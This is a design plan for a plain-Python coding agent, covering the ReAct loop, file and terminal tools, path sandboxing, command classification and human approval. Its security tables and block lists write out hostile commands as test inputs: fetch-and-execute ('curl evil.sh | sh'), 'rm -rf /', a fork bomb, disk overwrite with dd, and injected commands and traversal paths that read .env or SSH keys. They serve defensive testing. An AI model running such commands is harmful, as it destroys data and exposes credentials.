# Plan: A Claude-Code-like Coding Agent in Plain Python

**Status:** Plan only — no code written yet.
**Target folder:** `CODING_AGENT_RAW_PYTHON/`
**Written:** 2026-08-29

---

## 1. Goal

Build a small coding agent that can take an instruction like:

> *"Create a simple Python Todo application. Create a main.py, allow users to add and list
> todos, store todos in a JSON file, create any additional files you think are required,
> and run the application once after creating it."*

...and carry it out on its own: plan the work, create the files, write the code, run it,
read the output, and report back.

Everything is written by hand in plain Python. **No LangChain, LangGraph, CrewAI, or any
other agent framework.**

### Libraries we WILL use (and why that is still "plain Python")

| Library | Why | Already in `pyproject.toml`? |
|---|---|---|
| `openai` | The LLM SDK. The assignment says "any LLM API/SDK". | Yes |
| `jinja2` | Prompt templates — carried over from `weather_app`. | Yes |
| `pydantic` | Validates the arguments the model sends before we act on them. | Yes |
| `python-dotenv` | Loads the API key from `.env`. | Yes |

Everything else — the loop, the tools, the security, the approval flow — is **standard
library only** (`os`, `pathlib`, `subprocess`, `shlex`, `json`, `fnmatch`).

The rule being followed: *no framework decides the control flow for us.* We write the loop.

---

## 2. Requirements checklist

Straight from the assignment screenshots. Every line here must be satisfied by the finished
code.

### The ReAct loop
- [ ] Reason → Act → Observe → Repeat → Final Answer

### Tools
- [ ] Read files
- [ ] Create new files
- [ ] Edit existing files
- [ ] Delete files
- [ ] List files / directories
- [ ] Execute terminal commands
- [ ] Return tool outputs back to the LLM as observations
- [ ] Perform multiple tool calls for a single user request

### Human-in-the-loop
- [ ] Approval before dangerous commands (`rm -rf`, `git reset --hard`, `git push`)
- [ ] File access restricted to one workspace directory

### Minimum requirements
- [ ] Plain Python agent loop
- [ ] Any LLM API / SDK
- [ ] Filesystem CRUD tools
- [ ] Terminal execution tool
- [ ] Multi-step tool calling
- [ ] Basic security checks
- [ ] Human approval for dangerous actions
- [ ] Maximum step limit to avoid infinite loops

### Scope
- In scope: **code generation and file operations.**
- Out of scope for now: debugging existing projects.

---

## 3. The ReAct loop, and where each part lives in our code

ReAct = **Rea**son + **Act**. It is not a new idea to us — it is exactly the loop from
`weather_app/weather_agent/agent.py`, with the reasoning step made explicit.

```
┌───────────────────────────────────────────────────────────┐
│  REASON   the model writes its thinking as plain text     │
│              ↓                                            │
│  ACT      the model requests one or more tools            │
│              ↓                                            │
│  OBSERVE  WE run the tools and feed the results back      │
│              ↓                                            │
│  REPEAT   loop, until...                                  │
│              ↓                                            │
│  FINAL    the model replies with text and NO tool calls   │
└───────────────────────────────────────────────────────────┘
```

| ReAct step | What it actually is in our code |
|---|---|
| **Reason** | `message.content` — the assistant's text. The system prompt instructs the model to state its plan before acting. |
| **Act** | `message.tool_calls` — the structured request the model emits |
| **Observe** | The `{"role": "tool", "content": ..., "tool_call_id": ...}` messages we append |
| **Repeat** | `for step in range(MAX_STEPS):` in `agent.py` |
| **Final Answer** | `if not message.tool_calls: return message.content` |

**Key point to remember:** the LLM never runs anything. It only *asks*. Our Python code is
the only thing that touches the disk or the terminal — which is precisely what makes the
security layer possible.

---

## 4. Folder structure

```
CODING_AGENT_RAW_PYTHON/
├── PLAN.md                     ← this file
├── README.md                   ← how to run it, written last
├── main.py                     ← CLI entry point (the REPL)
│
├── workspace/                  ← THE SANDBOX. The agent can only touch things in here.
│   └── .gitkeep                   Everything it creates lands here.
│
└── coding_agent/
    ├── __init__.py             ← exports run_agent()
    ├── config.py               ← paths, limits, model name, denylists
    ├── client.py               ← provider selection + OpenAI client  (same pattern as weather_app)
    ├── security.py             ← ★ THE SECURITY CORE — path jail + command classifier
    ├── approvals.py            ← human-in-the-loop y/N prompt
    ├── schemas.py              ← the JSON tool schemas (TOOL_MENU) + arg models
    ├── agent.py                ← ★ THE REACT LOOP
    ├── prompts.py              ← Jinja environment + build_system_prompt()
    │
    ├── prompts/
    │   ├── system.jinja        ← the agent's instructions + ReAct rules + tool list
    │   └── greeting.jinja      ← CLI welcome text (for the human)
    │
    └── tools/
        ├── __init__.py         ← TOOL_FUNCTIONS registry  {name: callable}
        ├── read_file.py
        ├── write_file.py
        ├── edit_file.py
        ├── delete_file.py
        ├── list_files.py
        └── run_command.py
```

### Why this shape

It is deliberately the same architecture as `weather_app`, so nothing is unfamiliar:

- `client.py`, `prompts.py`, `schemas.py`, `agent.py`, `tools/__init__.py` all play the
  exact roles you already understand.
- The two genuinely new files are **`security.py`** and **`approvals.py`**. They exist
  because a weather tool can only read data, while a coding tool can delete your work.
- One tool per file in `tools/` keeps each one small enough to read in one sitting, and
  adding a seventh tool means adding one file plus one line in `tools/__init__.py`.

---

## 5. Module responsibilities

| File | Job | Depends on |
|---|---|---|
| `config.py` | All tunable values in one place: `WORKSPACE_DIR`, `MAX_STEPS`, `MAX_TOKENS`, `COMMAND_TIMEOUT`, `MAX_FILE_READ_CHARS`, `MAX_TOOL_OUTPUT_CHARS`, the denylists | stdlib only |
| `client.py` | "Which LLM, and how do I connect?" — `Provider` dataclass, `select_provider()`, `get_client_and_model()` | `openai`, `dotenv` |
| `security.py` | The gatekeeper. `resolve_safe_path()` and `classify_command()`. **No tool touches the disk without going through here.** | `config` |
| `approvals.py` | `request_approval(action, detail) -> bool`. Prints what is about to happen, reads y/N from the terminal, defaults to **No**. | stdlib |
| `tools/*.py` | One function per tool. Each returns a **string** (the observation). Each calls into `security.py` first. | `security`, `config` |
| `tools/__init__.py` | `TOOL_FUNCTIONS = {"read_file": read_file, ...}` — the dispatch table | the tool modules |
| `schemas.py` | `TOOL_MENU` (what the model sees) + pydantic arg models + `tool_catalog()` for the prompt | `pydantic` |
| `prompts.py` | Jinja environment, `build_system_prompt()`, `build_greeting()` | `jinja2`, `schemas` |
| `agent.py` | The ReAct loop. Calls the model, dispatches tools, appends observations, enforces `MAX_STEPS` | everything above |
| `main.py` | The CLI. Reads input, calls `run_agent()`, prints the trace | `coding_agent` |

---

## 6. ★ The security model — how we stop the agent hurting us

This is the part worth understanding deeply. There are **four independent layers**. Each one
assumes the others might fail.

### Layer 1 — The path jail (protects the filesystem)

**The threat:** the model asks to read `../../.env`, or `C:\Users\Micah\.ssh\id_rsa`, and
walks straight out of our folder.

**The mechanism** — one function that every file tool must call first:

```python
# security.py  (sketch)
from pathlib import Path
from .config import WORKSPACE_DIR, DENIED_NAMES, DENIED_SUFFIXES

JAIL = Path(WORKSPACE_DIR).resolve()

def resolve_safe_path(user_path: str) -> Path:
    # 1. Join onto the jail, then RESOLVE.
    #    .resolve() collapses ".." AND follows symlinks, giving a real absolute path.
    candidate = (JAIL / user_path).resolve()

    # 2. The actual check: is the resolved path inside the jail?
    if not candidate.is_relative_to(JAIL):          # Python 3.9+
        raise SecurityError(f"Path escapes the workspace: {user_path}")

    # 3. Belt and braces: block sensitive names even INSIDE the jail
    if candidate.name in DENIED_NAMES:              # .env, id_rsa, credentials.json ...
        raise SecurityError(f"Access to {candidate.name} is not allowed")
    if candidate.suffix in DENIED_SUFFIXES:         # .pem, .key, .pfx ...
        raise SecurityError(f"Access to {candidate.suffix} files is not allowed")
    if ".git" in candidate.parts:
        raise SecurityError("Access to .git is not allowed")

    return candidate
```

**Why `.resolve()` before comparing, and never string matching.**
This is the single most important detail in the whole file:

| Attack | A naive `str.startswith()` check | Our `.resolve()` + `is_relative_to()` |
|---|---|---|
| `../../.env` | The *string* `"workspace/../../.env"` starts with `"workspace"` → **allowed** ❌ | Resolves to `C:\Micah\...\.env`, not under the jail → **blocked** ✅ |
| `C:\Windows\System32\...` | Does not start with `workspace` → blocked ✅ | Not under jail → blocked ✅ |
| `workspace_evil/x.txt` | Starts with `"workspace"` → **allowed** ❌ | Not under jail → **blocked** ✅ |
| A symlink inside the jail pointing at `C:\` | Not detected → **allowed** ❌ | `.resolve()` follows it → **blocked** ✅ |

Resolve first, compare after. Comparing raw strings is how path-traversal bugs happen.

**Why an extra denylist when the jail already exists?** Defence in depth. If someone later
points `WORKSPACE_DIR` at the repo root by mistake, the denylist still keeps `.env` and
`.git` off limits. Two locks, one door.

### Layer 2 — Command safety (protects the machine)

**The threat:** the model runs `rm -rf /`, or sneaks a second command in via
`python main.py; rm -rf ..`.

**Three tiers, decided by `classify_command()`:**

| Tier | Examples | What happens |
|---|---|---|
| `BLOCKED` | `rm -rf /`, `mkfs`, `dd if=`, `shutdown`, `format`, `:(){ :|:& };:`, `curl … \| sh` | Refused outright. The human is never even asked. |
| `NEEDS_APPROVAL` | `rm`, `rm -rf <path>`, `git reset --hard`, `git push`, `git clean`, `mv`, `sudo …`, `pip install`, `npm install` | The human is shown the exact command and must type `y` |
| `ALLOWED` | `python main.py`, `ls`, `pytest`, `node index.js`, `git status` | Runs immediately |

**Three implementation rules that do the real work:**

1. **Reject shell metacharacters outright.** If the command contains any of
   `; & | > < \` $( ) && ||` we refuse it. Otherwise a command that classifies as ALLOWED
   could carry a BLOCKED one as a passenger:
   `python main.py && rm -rf ..`
   If the agent legitimately needs two commands, it can call the tool twice — which also
   means each one gets classified separately.

2. **`shell=False`, always.** We tokenise with `shlex.split()` and pass a **list** to
   `subprocess.run()`:
   ```python
   subprocess.run(shlex.split(cmd), shell=False, cwd=JAIL,
                  capture_output=True, text=True, timeout=COMMAND_TIMEOUT)
   ```
   With `shell=True`, the OS shell re-interprets the string and every quoting trick becomes
   an escape route. With `shell=False`, `"rm -rf /"` is just an argument list handed to one
   named program — there is no shell to exploit.

3. **`cwd=JAIL` and a `timeout`.** Commands run *inside* the workspace, so a bare `ls` or
   `python main.py` sees only the sandbox. The timeout stops an infinite loop in generated
   code from hanging the agent forever.

**Classification detail:** we match on the **tokenised** command (`shlex.split`), comparing
`tokens[0]` (the program) and scanning the flags — not a regex over the raw string. Regexes
over raw strings are easy to slip past with extra spacing or quoting.

### Layer 3 — Human in the loop

`approvals.py` is deliberately tiny and deliberately pessimistic:

```python
def request_approval(action: str, detail: str) -> bool:
    print(f"\n  ⚠  APPROVAL REQUIRED")
    print(f"     Action: {action}")
    print(f"     Detail: {detail}")
    choice = input("     Allow? [y/N]: ").strip().lower()
    return choice == "y"          # anything else, including Enter, means NO
```

Two design decisions:

- **Default is No.** Pressing Enter denies. The dangerous path must be the one that takes
  deliberate effort.
- **A denial is an observation, not a crash.** We return the string
  `"DENIED by user: <command>"` back to the model as the tool result. The model then sees
  the refusal and can adapt ("understood, I will not delete that — here is another
  approach"). Raising an exception would kill the whole run and teach the model nothing.

Which actions need approval:
- Any `NEEDS_APPROVAL` terminal command
- **Every `delete_file` call** — deletion is destructive and cheap to confirm
- Overwriting an existing file via `write_file` (we tell the human it is an overwrite, not a
  create)

### Layer 4 — Loop and resource limits

| Limit | Value (starting point) | Stops |
|---|---|---|
| `MAX_STEPS` | 25 | Infinite Reason→Act→Observe loops, and runaway API spend |
| `COMMAND_TIMEOUT` | 30s | A hung or infinite generated program |
| `MAX_FILE_READ_CHARS` | 20,000 | One huge file blowing the context window |
| `MAX_TOOL_OUTPUT_CHARS` | 5,000 | A chatty command flooding the conversation |
| `MAX_TOKENS` | 4,096 | Runaway single responses |

Truncated output is marked clearly, e.g. `... [truncated, 48210 chars total]`, so the model
knows it did not see everything and can narrow its next read.

### What this design does NOT protect against

Stated honestly, because knowing the gaps is part of understanding the design:

- The agent can still write **bad code** into the workspace and run it. The sandbox limits
  *where* it runs, not what the code does once running.
- It is a **path** jail, not an OS-level sandbox. Real isolation needs a container or VM.
- A network-capable command allowed through (`pip install`) could fetch anything. This is
  why `pip install` sits in `NEEDS_APPROVAL`.

---

## 7. The tool catalogue

Every tool returns a **string** — that string becomes the *Observe* step. Errors are
returned as readable strings, never raised, so the model can recover.

| Tool | Arguments | Returns | Guards |
|---|---|---|---|
| `read_file` | `path` | File contents, with line numbers | path jail; size limit |
| `write_file` | `path`, `content` | `"Created …"` / `"Overwrote …"` | path jail; approval **if overwriting** |
| `edit_file` | `path`, `old_string`, `new_string` | `"Replaced 1 occurrence in …"` | path jail; fails if `old_string` is missing or not unique |
| `delete_file` | `path` | `"Deleted …"` | path jail; **always** needs approval |
| `list_files` | `path` (default `"."`) | Indented tree listing | path jail; hides denied names |
| `run_command` | `command` | `exit code + stdout + stderr` | classifier; `shell=False`; `cwd=JAIL`; timeout |

### Why `edit_file` uses exact string replacement

Rather than "rewrite the whole file", `edit_file(path, old_string, new_string)`:

- **Is cheaper** — the model sends only the changed fragment, not the entire file.
- **Is safer** — if `old_string` is not found we return an error instead of silently
  producing something wrong.
- **Forces a read first** — the model cannot supply an exact `old_string` without having
  read the file, so blind edits are structurally impossible.
- **Catches ambiguity** — if `old_string` appears more than once we refuse and ask for more
  surrounding context, so we never edit the wrong occurrence.

This is exactly how Claude Code's own Edit tool behaves, and the reasoning is the same.

---

## 8. Build order

Nine steps. Each one ends with something runnable, so nothing is built on an unverified
foundation.

| # | Step | Deliverable | How we verify it |
|---|---|---|---|
| 1 | **Scaffold + config + client** | Folders, `__init__.py`s, `config.py`, `client.py` | `python -c "from coding_agent.client import get_client_and_model; print(get_client_and_model()[1])"` prints the model name |
| 2 | **★ `security.py`** | Path jail + command classifier | A throwaway script runs the attack table in §9 and every row behaves as expected |
| 3 | **File tools** | `read_file`, `write_file`, `edit_file`, `delete_file`, `list_files` | Call each by hand; confirm `../../.env` is refused |
| 4 | **`approvals.py` + `run_command`** | Terminal tool with the y/N gate | `python --version` runs; `git push` prompts; `rm -rf /` is refused outright |
| 5 | **`schemas.py`** | `TOOL_MENU` + pydantic arg models + `tool_catalog()` | Print the JSON; confirm all six tools are described |
| 6 | **Prompts** | `system.jinja` with the ReAct rules, `prompts.py` | Print the rendered prompt; confirm all six tools appear in the list |
| 7 | **★ `agent.py`** | The ReAct loop | Single-step task: *"create hello.py that prints hello"* |
| 8 | **`main.py`** | CLI with a readable trace | Interactive session works, `quit` exits cleanly |
| 9 | **End-to-end** | Run the assignment's Todo prompt | `workspace/` gets a working Todo app; the agent runs it and reports the output |

### Bugs we are carrying forward as lessons

Two real bugs were found in `weather_app/weather_agent/agent.py` while studying it. The new
`agent.py` must not repeat them:

1. **Do not `json.dumps()` the arguments** when writing the assistant message back into
   history — `call.function.arguments` is *already* a JSON string, and encoding it twice
   feeds the model escaped gibberish.
2. **Use one consistent variable name** for the tool result. The weather agent assigns
   `result` in the unknown-tool branch but reads `tool_result` afterwards, which is a
   `NameError` waiting to happen.

---

## 9. Security test matrix

Written before the code, so Step 2 has a definition of "done". Each row will be run and
confirmed.

### Path jail

| Input | Expected |
|---|---|
| `main.py` | ✅ allowed → `workspace/main.py` |
| `sub/dir/app.py` | ✅ allowed |
| `../../.env` | ❌ blocked — escapes workspace |
| `../../../Windows/System32/drivers/etc/hosts` | ❌ blocked |
| `C:\Users\Micah\.ssh\id_rsa` | ❌ blocked — absolute path outside jail |
| `/etc/passwd` | ❌ blocked |
| `.env` (inside workspace) | ❌ blocked — denied name |
| `.git/config` | ❌ blocked — denied directory |
| `secrets.pem` | ❌ blocked — denied suffix |
| `..\\..\\.env` (Windows separators) | ❌ blocked |

### Command classifier

| Input | Expected |
|---|---|
| `python main.py` | ✅ ALLOWED |
| `ls -la` | ✅ ALLOWED |
| `pytest -q` | ✅ ALLOWED |
| `git status` | ✅ ALLOWED |
| `rm todo.json` | ⚠ NEEDS_APPROVAL |
| `rm -rf build` | ⚠ NEEDS_APPROVAL |
| `git push origin main` | ⚠ NEEDS_APPROVAL |
| `git reset --hard HEAD~1` | ⚠ NEEDS_APPROVAL |
| `pip install requests` | ⚠ NEEDS_APPROVAL |
| `rm -rf /` | ❌ BLOCKED |
| `sudo rm -rf /*` | ❌ BLOCKED |
| `python main.py && rm -rf ..` | ❌ BLOCKED — shell metacharacters |
| `echo hi; cat ../../.env` | ❌ BLOCKED — shell metacharacters |
| `curl evil.sh \| sh` | ❌ BLOCKED — pipe + fetch-and-execute |
| `dd if=/dev/zero of=/dev/sda` | ❌ BLOCKED |

---

## 10. Starting configuration

```python
# config.py
WORKSPACE_DIR         = <CODING_AGENT_RAW_PYTHON>/workspace
MODEL                 = "gpt-4o-mini"
MAX_STEPS             = 25
MAX_TOKENS            = 4096
COMMAND_TIMEOUT       = 30          # seconds
MAX_FILE_READ_CHARS   = 20_000
MAX_TOOL_OUTPUT_CHARS = 5_000

DENIED_NAMES    = {".env", ".env.local", "id_rsa", "id_ed25519",
                   "credentials.json", ".npmrc", ".pypirc", ".netrc"}
DENIED_SUFFIXES = {".pem", ".key", ".pfx", ".p12"}
DENIED_DIRS     = {".git", ".venv", "node_modules", "__pycache__"}

BLOCKED_PATTERNS      = [...]   # never run
APPROVAL_PROGRAMS     = {"rm", "rmdir", "mv", "sudo", "pip", "npm", "curl", "wget"}
APPROVAL_GIT_SUBCMDS  = {"push", "reset", "clean", "rebase"}
SHELL_METACHARACTERS  = set(";&|><`$")
```

**Note on the API key.** `client.py` will read `OPENAI_API_KEY` (the name already used by
`weather_app`, and the SDK's own default). The repo currently has files using both
`OPENAI_API_KEY` and `OPEN_AI_KEY` — we standardise on `OPENAI_API_KEY` here.

---

## 11. Deliberately out of scope

Keeping the build small enough to fully understand:

- **No debugging of existing projects** — the assignment says code generation and file
  operations only.
- **No conversation memory across CLI restarts** — history lives in memory for the session.
- **No streaming output** — one complete response per turn is easier to trace.
- **No Streamlit UI** — a CLI is the honest fit for a *Claude Code*-like tool, and the
  approval prompt needs a terminal to read `y/N` from.
- **No parallel tool execution** — tools run one after another, in the order requested, so
  the trace stays readable.

---

## 12. What you will be able to explain when this is finished

1. How a ReAct loop works, and why the model asking is separate from us executing.
2. Why `.resolve()` before comparison is the whole ballgame in path-traversal defence.
3. Why `shell=False` matters more than any blocklist of dangerous strings.
4. Why a denied action should be returned to the model as an observation rather than raised
   as an exception.
5. Why an exact-string `edit_file` is safer and cheaper than rewriting whole files.
6. Where every one of the assignment's checkboxes is satisfied in the code.

---

## Next step

Say the word and we start at **Step 1: scaffold + `config.py` + `client.py`**, then work
down the table in §8 one step at a time, verifying each before moving on.
